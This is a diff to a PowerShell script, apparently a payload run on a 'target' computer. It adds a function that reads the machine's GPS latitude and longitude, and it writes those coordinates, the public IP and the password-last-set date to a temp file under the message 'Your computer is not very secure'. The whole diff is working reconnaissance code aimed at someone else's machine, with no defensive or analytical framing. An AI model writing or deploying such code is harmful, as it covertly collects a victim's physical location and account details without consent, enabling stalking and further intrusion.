@@ -73,6 +73,43 @@ echo "`nYour computer is not very secure" >> $Env:temp\foo.txt
 
 <#
 
+.NOTES 
+	This is to get the current Latitide and Longitude of your target
+#>
+
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
+
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
+
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
+
+}
+
+$GL = Get-GeoLocation
+if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
+
+
+#############################################################################################################################################
+
+<#
+
 .NOTES  
 	This will get the public IP from the target computer
 #>
@@ -98,8 +135,8 @@ function Get-PubIP {
 }
 
 $PubIP = Get-PubIP
+if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
 
-echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt
 
 ###########################################################################################################
 
@@ -140,7 +177,8 @@ echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt
 }
 
 $pls = Get-Days_Set
-echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt
+if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }
+
 
 ###########################################################################################################
 
